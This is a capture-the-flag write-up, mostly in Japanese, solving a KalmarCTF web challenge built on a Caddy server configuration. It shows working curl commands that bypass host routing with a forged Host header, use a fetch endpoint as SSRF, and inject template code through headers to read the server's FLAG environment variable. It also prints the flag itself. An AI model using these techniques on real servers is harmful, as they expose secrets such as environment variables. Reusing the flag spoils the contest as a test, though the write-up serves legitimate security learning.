# Ez ⛳ v3:web:146pts
To get the flag, you need: the mTLS cert, connecting from localhost, ... and break physics? Should be easy!  
Challenge note: the handout files contains `tls internal` while the hosted challenge mostly use real TLS.  
NOTE: Remote is working as intended! Even with the redirects.  
NOTE 2: Backup instance with `tls internal` (= broken TLS cert) `49.13.233.207`  

[https://caddy.chal-kalmarc.tf](https://caddy.chal-kalmarc.tf)  

[caddy-handout.zip](caddy-handout.zip)  

# Solution
URLとソースコードがもらえる。  
ソースの中の主要なファイルCaddyfileは以下の通りであった。  
```
{
        debug
        servers  {
                strict_sni_host insecure_off
        }
}

*.caddy.chal-kalmarc.tf {
        tls internal
        redir public.caddy.chal-kalmarc.tf
}

public.caddy.chal-kalmarc.tf {
        tls internal
        respond "PUBLIC LANDING PAGE. NO FUN HERE."
}

private.caddy.chal-kalmarc.tf {
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }

        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
        templates
        respond /cat     `{{ cat "HELLO" "WORLD" }}`
        respond /fetch/* `{{ httpInclude "/{http.request.orig_uri.path.1}" }}`
        respond /headers `{{ .Req.Header | mustToPrettyJson }}`
        respond /ip      `{{ .ClientIP }}`
        respond /whoami  `{http.auth.user.id}`
        respond "UNKNOWN ACTION"
}
```
CaddyなるWebサーバらしく、`private.caddy.chal-kalmarc.tf/flag`からのレスポンスでフラグが取得できるが、いくつかの制限があるようだ。  
初めに問題のURLにアクセスすると、`public.caddy.chal-kalmarc.tf`に飛ぼうとする。  
以下の制限が原因のようだ。  
```
*.caddy.chal-kalmarc.tf {
        tls internal
        redir public.caddy.chal-kalmarc.tf
}

public.caddy.chal-kalmarc.tf {
        tls internal
        respond "PUBLIC LANDING PAGE. NO FUN HERE."
}
```
`*`ですべてを`public`へ飛ばしている。  
何とかして`private`へリクエストを到達させたい。  
パスやヘッダの加工を試していると、`Host`ヘッダを`private`にすることで到達した(うまく証明書の制限も回避したようだ)。  
```bash
$ curl https://public.caddy.chal-kalmarc.tf/
PUBLIC LANDING PAGE. NO FUN HERE.
$ curl https://public.caddy.chal-kalmarc.tf/flag -H 'Host: private.caddy.chal-kalmarc.tf'
No ...
```
ただ、`/flag`は以下の条件によってさらに制限されている。  
```
private.caddy.chal-kalmarc.tf {
~~~
        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
~~~
}
```
`remote_ip`が`127.0.0.1`であり、かつ`1 == 1`ではないという意味不明な条件だ。  
ここで、値や関数がテンプレートに埋め込まれたいくつかの機能を利用できることを思い出す。  
```
        templates
        respond /cat     `{{ cat "HELLO" "WORLD" }}`
        respond /fetch/* `{{ httpInclude "/{http.request.orig_uri.path.1}" }}`
        respond /headers `{{ .Req.Header | mustToPrettyJson }}`
        respond /ip      `{{ .ClientIP }}`
        respond /whoami  `{http.auth.user.id}`
        respond "UNKNOWN ACTION"
```
`/fetch/*`があまりにも怪しいが、`remote_ip`の制限をSSRFで回避できないだろうか。  
```bash
$ curl https://public.caddy.chal-kalmarc.tf/fetch/flag -H 'Host: private.caddy.chal-kalmarc.tf'
Would be too easy, right?
```
`/flag`を`/fetch/`することで`remote_ip`の制限は回避できたが、`1 == 1`がどうやっても突破できない。  
あきらめて方針転換し、他にユーザが値を操作可能な機能を見ると、`/headers`なるリクエストのヘッダをJSONとして返すよくわからないものがある。  
ここで、ヘッダに`{{.ClientIP}}`のようなテンプレートと解釈できるものを設定し、`/fetch/*`で`/headers`を読み取るとどうなるだろうか。  
ヘッダ`Satoki`をつけて試す。  
```bash
$ curl https://public.caddy.chal-kalmarc.tf/fetch/headers -H 'Host: private.caddy.chal-kalmarc.tf' -H 'Satoki: {{.ClientIP}}'
{
  "Accept": [
    "*/*"
  ],
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Satoki": [
    "172.70.108.142"
  ],
  "User-Agent": [
    "curl/7.81.0"
  ]
}
```
なんと`/headers`が返したものがテンプレートとして解釈された。  
これでSSTIが可能となったため、`1 == 1`を突破せずとも、ファイル読み込みや環境変数の取得でフラグが得られそうだ。  
[Caddyのドキュメント](https://caddyserver.com/docs/modules/http.handlers.templates)を探すと`{{env "VAR_NAME"}}`とすれば環境変数VAR_NAMEが取得できるようだ。  
しかし、実際に行ってみると`{{env "FLAG"}}`どころか`{{cat "FLAG"}}`すらできない。  
`cat`はもともとのテンプレートで使われているので、使えないはずがない。  
ここでチームメンバが`"`が悪さをしているのではないかと呟いていた。  
`"`無しに文字列を作る方法はないかと探すと、`{{.Req.Header}}`が使えることに気づく。  
`{{env (first (.Req.Header.Tsuji))}}`とし、ヘッダ`Tsuji: FLAG`を設定すれば`"`なしに文字列`FLAG`を作り、`env`に渡せる(`.Req.Header.Tsuji`は配列が帰ってくるため`first`で最初の要素を抜き出している)。  
以下のように行う。  
```bash
$ curl https://public.caddy.chal-kalmarc.tf/fetch/headers -H 'Host: private.caddy.chal-kalmarc.tf' -H 'Satoki: {{env (first (.Req.Header.Tsuji))}}' -H 'Tsuji: FLAG'
{
  "Accept": [
    "*/*"
  ],
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Satoki": [
    "kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}"
  ],
  "Tsuji": [
    "FLAG"
  ],
  "User-Agent": [
    "curl/7.81.0"
  ]
}
```
flagが得られた。  

## kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}